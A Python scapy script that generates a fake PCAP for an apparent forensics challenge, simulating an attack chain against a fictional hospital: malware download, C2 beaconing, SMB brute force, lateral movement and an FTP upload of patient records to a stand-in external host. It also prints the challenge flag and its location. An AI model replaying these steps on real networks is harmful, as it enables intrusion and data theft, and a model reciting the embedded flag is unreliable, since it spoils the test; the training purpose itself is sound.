#!/usr/bin/env python3
"""
Multi-Stage Attack Chain PCAP Generator
Creates realistic network traffic showing a complete cyber attack from initial access to data exfiltration
"""

from scapy.all import *
import random
import struct
import sys
import datetime

def generate_attack_pcap(output_file):
    """Generate PCAP file with complete multi-stage attack chain"""

    packets = []

    # Network configuration
    # Internal network: 10.0.10.0/24 (Patient Records Department)
    victim_workstation = "10.0.10.25"  # Initially compromised workstation
    file_server = "10.0.10.50"         # Patient records file server
    domain_controller = "10.0.10.5"    # Active Directory server
    dns_server = "10.0.10.1"           # Internal DNS
    gateway = "10.0.10.1"              # Default gateway

    # Other internal hosts for background traffic
    internal_hosts = [
        "10.0.10.15", "10.0.10.22", "10.0.10.33", "10.0.10.41",
        "10.0.10.56", "10.0.10.67", "10.0.10.78", "10.0.10.89"
    ]

    # Attacker infrastructure (external)
    malicious_domain = "malicious-cdn.tk"
    malicious_ip = "185.220.101.73"
    c2_domain = "c2-server.tk"
    c2_ip = "185.220.101.88"
    exfil_server = "198.51.100.42"  # FTP exfiltration server

    # Legitimate external services
    legit_domains = [
        ("google.com", "142.250.185.46"),
        ("microsoft.com", "20.112.52.29"),
        ("office365.com", "40.97.130.162"),
        ("medicarehealth.org", "52.0.0.15"),
        ("nih.gov", "156.40.242.24"),
        ("cdc.gov", "170.147.1.12")
    ]

    print("[*] Generating Multi-Stage Attack Chain PCAP")
    print("[*] Attack scenario: Targeted attack on MediCare Health Systems")
    print()

    # Start time: Friday, December 15, 2024, 2:00 PM
    current_time = 1702656000.0
    start_time = current_time

    def format_time(timestamp):
        """Convert timestamp to readable time offset"""
        offset = int(timestamp - start_time)
        hours = offset // 3600
        minutes = (offset % 3600) // 60
        return f"T+{hours:02d}:{minutes:02d}"

    # ========================================================================
    # PHASE 0: NORMAL BASELINE TRAFFIC (First 30 minutes)
    # ========================================================================
    print("[*] Phase 0: Generating normal baseline traffic (0-30 min)...")

    for i in range(100):
        # Random internal host doing normal activities
        src_host = random.choice([victim_workstation] + internal_hosts)

        # DNS queries for legitimate domains
        if random.random() < 0.3:
            domain, ip = random.choice(legit_domains)

            # DNS query
            dns_query = IP(src=src_host, dst=dns_server) / \
                        UDP(sport=random.randint(49152, 65535), dport=53) / \
                        DNS(rd=1, qd=DNSQR(qname=domain))
            dns_query.time = current_time
            packets.append(dns_query)

            # DNS response
            dns_response = IP(src=dns_server, dst=src_host) / \
                          UDP(sport=53, dport=dns_query[UDP].sport) / \
                          DNS(id=dns_query[DNS].id, qr=1, aa=0, qd=DNSQR(qname=domain),
                              an=DNSRR(rrname=domain, rdata=ip))
            dns_response.time = current_time + 0.05
            packets.append(dns_response)

            current_time += random.uniform(1, 3)

        # HTTP/HTTPS traffic to legitimate sites
        if random.random() < 0.4:
            domain, dest_ip = random.choice(legit_domains)

            # HTTP GET request
            http_request = IP(src=src_host, dst=dest_ip) / \
                          TCP(sport=random.randint(49152, 65535), dport=80, flags="PA") / \
                          Raw(load=f"GET / HTTP/1.1\r\nHost: {domain}\r\n\r\n")
            http_request.time = current_time
            packets.append(http_request)

            current_time += random.uniform(5, 20)

        # SMB traffic to domain controller (authentication)
        if random.random() < 0.2:
            smb_syn = IP(src=src_host, dst=domain_controller) / \
                     TCP(sport=random.randint(49152, 65535), dport=445, flags="S")
            smb_syn.time = current_time
            packets.append(smb_syn)

            current_time += random.uniform(10, 30)

    print(f"    Generated {len(packets)} baseline packets")

    # ========================================================================
    # PHASE 1: INITIAL ACCESS - Malicious Download (T+30 minutes)
    # ========================================================================
    current_time = start_time + 1800  # 30 minutes
    print(f"\n[*] Phase 1: Initial Access - Malicious payload download ({format_time(current_time)})...")

    # DNS query for malicious domain
    dns_query = IP(src=victim_workstation, dst=dns_server) / \
                UDP(sport=54321, dport=53) / \
                DNS(rd=1, qd=DNSQR(qname=malicious_domain))
    dns_query.time = current_time
    packets.append(dns_query)

    dns_response = IP(src=dns_server, dst=victim_workstation) / \
                  UDP(sport=53, dport=54321) / \
                  DNS(id=dns_query[DNS].id, qr=1, aa=0, qd=DNSQR(qname=malicious_domain),
                      an=DNSRR(rrname=malicious_domain, rdata=malicious_ip))
    dns_response.time = current_time + 0.03
    packets.append(dns_response)

    current_time += 2

    # HTTP GET request for malicious executable
    http_get = f"""GET /downloads/system-update.exe HTTP/1.1\r
Host: {malicious_domain}\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r
Accept: */*\r
Connection: keep-alive\r
\r
"""

    malicious_download = IP(src=victim_workstation, dst=malicious_ip) / \
                        TCP(sport=55123, dport=80, flags="PA") / \
                        Raw(load=http_get)
    malicious_download.time = current_time
    packets.append(malicious_download)

    current_time += 0.5

    # HTTP 200 OK response with executable
    http_response = f"""HTTP/1.1 200 OK\r
Content-Type: application/octet-stream\r
Content-Length: 2457600\r
Content-Disposition: attachment; filename="system-update.exe"\r
Server: nginx/1.18.0\r
\r
"""

    response_pkt = IP(src=malicious_ip, dst=victim_workstation) / \
                  TCP(sport=80, dport=55123, flags="PA") / \
                  Raw(load=http_response)
    response_pkt.time = current_time
    packets.append(response_pkt)

    # Simulate file download with several data packets
    for i in range(5):
        data_pkt = IP(src=malicious_ip, dst=victim_workstation) / \
                  TCP(sport=80, dport=55123, flags="PA") / \
                  Raw(load=b"MZ" + random.randbytes(1400))  # PE executable signature
        data_pkt.time = current_time + (i * 0.1)
        packets.append(data_pkt)

    print(f"    Malicious payload downloaded: system-update.exe from {malicious_domain}")
    print(f"    Compromised host: {victim_workstation}")

    # ========================================================================
    # PHASE 2: COMMAND & CONTROL - C2 Beaconing (T+45 minutes)
    # ========================================================================
    current_time = start_time + 2700  # 45 minutes
    print(f"\n[*] Phase 2: C2 Communication - HTTPS beaconing ({format_time(current_time)})...")

    # DNS lookup for C2 server
    dns_query = IP(src=victim_workstation, dst=dns_server) / \
                UDP(sport=54322, dport=53) / \
                DNS(rd=1, qd=DNSQR(qname=c2_domain))
    dns_query.time = current_time
    packets.append(dns_query)

    dns_response = IP(src=dns_server, dst=victim_workstation) / \
                  UDP(sport=53, dport=54322) / \
                  DNS(id=dns_query[DNS].id, qr=1, aa=0, qd=DNSQR(qname=c2_domain),
                      an=DNSRR(rrname=c2_domain, rdata=c2_ip))
    dns_response.time = current_time + 0.04
    packets.append(dns_response)

    current_time += 1

    # C2 beacons every 5 minutes (create 12 beacons over 1 hour)
    beacon_count = 0
    for beacon in range(12):
        beacon_time = current_time + (beacon * 300)  # Every 5 minutes

        # TLS Client Hello to C2 server (raw bytes with SNI extension)
        sport = random.randint(49152, 65535)
        # Build SNI extension: type=0x0000, with server name
        sni_name = c2_domain.encode()
        sni_entry = struct.pack("!BH", 0, len(sni_name)) + sni_name  # host type + length + name
        sni_list = struct.pack("!H", len(sni_entry)) + sni_entry     # server name list length
        sni_ext = struct.pack("!HH", 0x0000, len(sni_list)) + sni_list  # ext type + ext length
        # Build Client Hello
        client_random = struct.pack("!I", int(beacon_time)) + random.randbytes(28)
        ch_body = struct.pack("!HI", 0x0303, 0)  # version + gmt placeholder
        ch_body = struct.pack("!H", 0x0303) + client_random  # version + 32 byte random
        ch_body += struct.pack("!B", 0)           # session id length = 0
        ch_body += struct.pack("!H", 2) + struct.pack("!H", 0x00ff)  # cipher suites
        ch_body += struct.pack("!B", 1) + struct.pack("!B", 0)       # compression methods
        ch_body += struct.pack("!H", len(sni_ext)) + sni_ext         # extensions
        # Handshake header: type=1 (ClientHello) + 3-byte length
        handshake = struct.pack("!B", 1) + struct.pack("!I", len(ch_body))[1:] + ch_body
        # TLS record: content_type=22 (handshake), version=0x0301, length
        tls_record = struct.pack("!BHH", 22, 0x0301, len(handshake)) + handshake

        tls_hello = IP(src=victim_workstation, dst=c2_ip) / \
                   TCP(sport=sport, dport=443, flags="PA") / \
                   Raw(load=tls_record)
        tls_hello.time = beacon_time
        packets.append(tls_hello)

        # Small encrypted data exchange (command receipt)
        encrypted_response = IP(src=c2_ip, dst=victim_workstation) / \
                           TCP(sport=443, dport=sport, flags="PA") / \
                           Raw(load=random.randbytes(150))
        encrypted_response.time = beacon_time + 0.2
        packets.append(encrypted_response)

        beacon_count += 1

    print(f"    Generated {beacon_count} C2 beacons to {c2_domain} ({c2_ip})")
    print(f"    Beacon interval: 5 minutes")

    # ========================================================================
    # PHASE 3: CREDENTIAL HARVESTING - SMB Brute Force (T+90 minutes)
    # ========================================================================
    current_time = start_time + 5400  # 90 minutes
    print(f"\n[*] Phase 3: Credential Harvesting - SMB authentication attempts ({format_time(current_time)})...")

    failed_attempts = 0
    # Failed login attempts (credential stuffing)
    for attempt in range(8):
        # SMB Session Setup Request (failed)
        smb_syn = IP(src=victim_workstation, dst=domain_controller) / \
                 TCP(sport=random.randint(49152, 65535), dport=445, flags="S")
        smb_syn.time = current_time
        packets.append(smb_syn)

        smb_synack = IP(src=domain_controller, dst=victim_workstation) / \
                    TCP(sport=445, dport=smb_syn[TCP].sport, flags="SA")
        smb_synack.time = current_time + 0.01
        packets.append(smb_synack)

        # SMB Negotiate Protocol
        smb_negotiate = IP(src=victim_workstation, dst=domain_controller) / \
                       TCP(sport=smb_syn[TCP].sport, dport=445, flags="PA") / \
                       Raw(load=b"\x00\x00\x00\x85\xffSMB")
        smb_negotiate.time = current_time + 0.02
        packets.append(smb_negotiate)

        # Failed authentication (NTSTATUS: 0xC000006D - bad username/password)
        smb_failure = IP(src=domain_controller, dst=victim_workstation) / \
                     TCP(sport=445, dport=smb_syn[TCP].sport, flags="PA") / \
                     Raw(load=b"\x00\x00\x00\x23\xffSMB\x72\x00\x00\x00\x00\xd8")
        smb_failure.time = current_time + 0.15
        packets.append(smb_failure)

        current_time += random.uniform(3, 8)
        failed_attempts += 1

    print(f"    {failed_attempts} failed SMB authentication attempts")

    # Successful authentication (attacker found valid credentials)
    current_time += 30

    smb_success_syn = IP(src=victim_workstation, dst=domain_controller) / \
                     TCP(sport=56789, dport=445, flags="S")
    smb_success_syn.time = current_time
    packets.append(smb_success_syn)

    smb_success_synack = IP(src=domain_controller, dst=victim_workstation) / \
                        TCP(sport=445, dport=56789, flags="SA")
    smb_success_synack.time = current_time + 0.01
    packets.append(smb_success_synack)

    smb_success = IP(src=victim_workstation, dst=domain_controller) / \
                 TCP(sport=56789, dport=445, flags="PA") / \
                 Raw(load=b"\x00\x00\x00\x85\xffSMB\x73\x00\x00\x00\x00")
    smb_success.time = current_time + 0.02
    packets.append(smb_success)

    print(f"    Successful authentication achieved")

    # ========================================================================
    # PHASE 4: LATERAL MOVEMENT - Access File Server (T+120 minutes)
    # ========================================================================
    current_time = start_time + 7200  # 120 minutes (2 hours)
    print(f"\n[*] Phase 4: Lateral Movement - SMB to file server ({format_time(current_time)})...")

    # SMB connection to file server
    lateral_syn = IP(src=victim_workstation, dst=file_server) / \
                 TCP(sport=57123, dport=445, flags="S")
    lateral_syn.time = current_time
    packets.append(lateral_syn)

    lateral_synack = IP(src=file_server, dst=victim_workstation) / \
                    TCP(sport=445, dport=57123, flags="SA")
    lateral_synack.time = current_time + 0.01
    packets.append(lateral_synack)

    # SMB Tree Connect to administrative share
    tree_connect = IP(src=victim_workstation, dst=file_server) / \
                  TCP(sport=57123, dport=445, flags="PA") / \
                  Raw(load=b"\x00\x00\x00\x5c\xffSMB\x75\x00\x00\x00\x00" + \
                           "\\\\FILESERVER\\PatientRecords$".encode('utf-16le'))
    tree_connect.time = current_time + 0.05
    packets.append(tree_connect)

    tree_response = IP(src=file_server, dst=victim_workstation) / \
                   TCP(sport=445, dport=57123, flags="PA") / \
                   Raw(load=b"\x00\x00\x00\x27\xffSMB\x75\x00\x00\x00\x00")
    tree_response.time = current_time + 0.08
    packets.append(tree_response)

    # Multiple file access requests (browsing patient records)
    for i in range(10):
        file_request = IP(src=victim_workstation, dst=file_server) / \
                      TCP(sport=57123, dport=445, flags="PA") / \
                      Raw(load=b"\x00\x00\x00\x45\xffSMB\xa0")
        file_request.time = current_time + 0.1 + (i * 2)
        packets.append(file_request)

        file_response = IP(src=file_server, dst=victim_workstation) / \
                       TCP(sport=445, dport=57123, flags="PA") / \
                       Raw(load=b"\x00\x00\x00\x35\xffSMB\xa0")
        file_response.time = current_time + 0.2 + (i * 2)
        packets.append(file_response)

    print(f"    Accessed file server: {file_server}")
    print(f"    Share: \\\\FILESERVER\\PatientRecords$")
    print(f"    Files enumerated: 10+")

    # ========================================================================
    # PHASE 5: DATA EXFILTRATION - FTP Upload (T+180 minutes)
    # ========================================================================
    current_time = start_time + 10800  # 180 minutes (3 hours)
    print(f"\n[*] Phase 5: Data Exfiltration - FTP upload ({format_time(current_time)})...")

    # FTP connection to external server
    ftp_syn = IP(src=victim_workstation, dst=exfil_server) / \
             TCP(sport=58901, dport=21, flags="S")
    ftp_syn.time = current_time
    packets.append(ftp_syn)

    ftp_synack = IP(src=exfil_server, dst=victim_workstation) / \
                TCP(sport=21, dport=58901, flags="SA")
    ftp_synack.time = current_time + 0.05
    packets.append(ftp_synack)

    # FTP banner
    ftp_banner = IP(src=exfil_server, dst=victim_workstation) / \
                TCP(sport=21, dport=58901, flags="PA") / \
                Raw(load=b"220 ProFTPD Server ready.\r\n")
    ftp_banner.time = current_time + 0.1
    packets.append(ftp_banner)

    # FTP USER command
    ftp_user = IP(src=victim_workstation, dst=exfil_server) / \
              TCP(sport=58901, dport=21, flags="PA") / \
              Raw(load=b"USER anonymous\r\n")
    ftp_user.time = current_time + 1
    packets.append(ftp_user)

    ftp_user_ok = IP(src=exfil_server, dst=victim_workstation) / \
                 TCP(sport=21, dport=58901, flags="PA") / \
                 Raw(load=b"331 Password required.\r\n")
    ftp_user_ok.time = current_time + 1.05
    packets.append(ftp_user_ok)

    # FTP PASS command
    ftp_pass = IP(src=victim_workstation, dst=exfil_server) / \
              TCP(sport=58901, dport=21, flags="PA") / \
              Raw(load=b"PASS guest\r\n")
    ftp_pass.time = current_time + 2
    packets.append(ftp_pass)

    ftp_login = IP(src=exfil_server, dst=victim_workstation) / \
               TCP(sport=21, dport=58901, flags="PA") / \
               Raw(load=b"230 Login successful.\r\n")
    ftp_login.time = current_time + 2.05
    packets.append(ftp_login)

    # FTP TYPE I (binary mode)
    ftp_type = IP(src=victim_workstation, dst=exfil_server) / \
              TCP(sport=58901, dport=21, flags="PA") / \
              Raw(load=b"TYPE I\r\n")
    ftp_type.time = current_time + 3
    packets.append(ftp_type)

    ftp_type_ok = IP(src=exfil_server, dst=victim_workstation) / \
                 TCP(sport=21, dport=58901, flags="PA") / \
                 Raw(load=b"200 Type set to I.\r\n")
    ftp_type_ok.time = current_time + 3.05
    packets.append(ftp_type_ok)

    # FTP PASV (passive mode)
    ftp_pasv = IP(src=victim_workstation, dst=exfil_server) / \
              TCP(sport=58901, dport=21, flags="PA") / \
              Raw(load=b"PASV\r\n")
    ftp_pasv.time = current_time + 4
    packets.append(ftp_pasv)

    ftp_pasv_ok = IP(src=exfil_server, dst=victim_workstation) / \
                 TCP(sport=21, dport=58901, flags="PA") / \
                 Raw(load=b"227 Entering Passive Mode (198,51,100,42,195,101).\r\n")
    ftp_pasv_ok.time = current_time + 4.05
    packets.append(ftp_pasv_ok)

    # FTP STOR command - THIS CONTAINS THE FLAG
    ftp_stor = IP(src=victim_workstation, dst=exfil_server) / \
              TCP(sport=58901, dport=21, flags="PA") / \
              Raw(load=b"STOR patient-records-OCR{full_4tt4ck_ch41n_m4pp3d}.zip\r\n")
    ftp_stor.time = current_time + 5
    packets.append(ftp_stor)

    ftp_stor_ok = IP(src=exfil_server, dst=victim_workstation) / \
                 TCP(sport=21, dport=58901, flags="PA") / \
                 Raw(load=b"150 Opening BINARY mode data connection.\r\n")
    ftp_stor_ok.time = current_time + 5.05
    packets.append(ftp_stor_ok)

    # FTP data connection (port 50021 = 195*256 + 101)
    data_port = 50021
    ftp_data_syn = IP(src=victim_workstation, dst=exfil_server) / \
                  TCP(sport=58902, dport=data_port, flags="S")
    ftp_data_syn.time = current_time + 5.1
    packets.append(ftp_data_syn)

    ftp_data_synack = IP(src=exfil_server, dst=victim_workstation) / \
                     TCP(sport=data_port, dport=58902, flags="SA")
    ftp_data_synack.time = current_time + 5.15
    packets.append(ftp_data_synack)

    # Large file transfer (simulated with multiple data packets)
    print(f"    Uploading: patient-records-OCR{{full_4tt4ck_ch41n_m4pp3d}}.zip")
    print(f"    Destination: {exfil_server}:21 (FTP)")

    for i in range(20):
        data_chunk = IP(src=victim_workstation, dst=exfil_server) / \
                    TCP(sport=58902, dport=data_port, flags="PA") / \
                    Raw(load=random.randbytes(1400))
        data_chunk.time = current_time + 6 + (i * 0.5)
        packets.append(data_chunk)

    # Transfer complete
    ftp_transfer_done = IP(src=exfil_server, dst=victim_workstation) / \
                       TCP(sport=21, dport=58901, flags="PA") / \
                       Raw(load=b"226 Transfer complete.\r\n")
    ftp_transfer_done.time = current_time + 20
    packets.append(ftp_transfer_done)

    # FTP QUIT
    ftp_quit = IP(src=victim_workstation, dst=exfil_server) / \
              TCP(sport=58901, dport=21, flags="PA") / \
              Raw(load=b"QUIT\r\n")
    ftp_quit.time = current_time + 21
    packets.append(ftp_quit)

    ftp_goodbye = IP(src=exfil_server, dst=victim_workstation) / \
                 TCP(sport=21, dport=58901, flags="PA") / \
                 Raw(load=b"221 Goodbye.\r\n")
    ftp_goodbye.time = current_time + 21.05
    packets.append(ftp_goodbye)

    print(f"    File size: ~15 MB (patient database export)")
    print(f"    FLAG EMBEDDED IN FILENAME!")

    # ========================================================================
    # Add some post-exfiltration normal traffic to make it realistic
    # ========================================================================
    current_time += 300
    print(f"\n[*] Adding post-exfiltration cleanup traffic...")

    for i in range(30):
        src_host = random.choice(internal_hosts + [victim_workstation])
        domain, dest_ip = random.choice(legit_domains)

        http_request = IP(src=src_host, dst=dest_ip) / \
                      TCP(sport=random.randint(49152, 65535), dport=80, flags="PA") / \
                      Raw(load=f"GET / HTTP/1.1\r\nHost: {domain}\r\n\r\n")
        http_request.time = current_time
        packets.append(http_request)

        current_time += random.uniform(10, 40)

    # ========================================================================
    # Write PCAP file
    # ========================================================================
    total_duration = int(current_time - start_time)
    hours = total_duration // 3600
    minutes = (total_duration % 3600) // 60

    print(f"\n[*] Attack Timeline Summary:")
    print(f"    Total duration: {hours}h {minutes}m")
    print(f"    Total packets: {len(packets)}")
    print(f"    Compromised host: {victim_workstation}")
    print(f"    Attacker infrastructure: {malicious_ip}, {c2_ip}, {exfil_server}")
    print()
    print(f"[*] Writing PCAP to {output_file}...")

    wrpcap(output_file, packets)

    print(f"[+] PCAP generated successfully!")
    print()
    print(f"[+] Key Indicators of Compromise (IOCs):")
    print(f"    - Malicious domain: {malicious_domain} ({malicious_ip})")
    print(f"    - C2 server: {c2_domain} ({c2_ip})")
    print(f"    - Exfiltration server: {exfil_server}")
    print(f"    - Malicious file: system-update.exe")
    print(f"    - Exfiltrated file: patient-records-OCR{{full_4tt4ck_ch41n_m4pp3d}}.zip")
    print()
    print(f"[+] Attack Chain Stages:")
    print(f"    1. Initial Access: T+30min (HTTP malware download)")
    print(f"    2. C2 Communication: T+45min (HTTPS beaconing every 5min)")
    print(f"    3. Credential Harvesting: T+90min (SMB brute force)")
    print(f"    4. Lateral Movement: T+120min (SMB to file server)")
    print(f"    5. Data Exfiltration: T+180min (FTP upload)")
    print()
    print(f"[+] Flag location: Embedded in FTP STOR command filename")

if __name__ == "__main__":
    output = sys.argv[1] if len(sys.argv) > 1 else "full-attack.pcap"
    generate_attack_pcap(output)
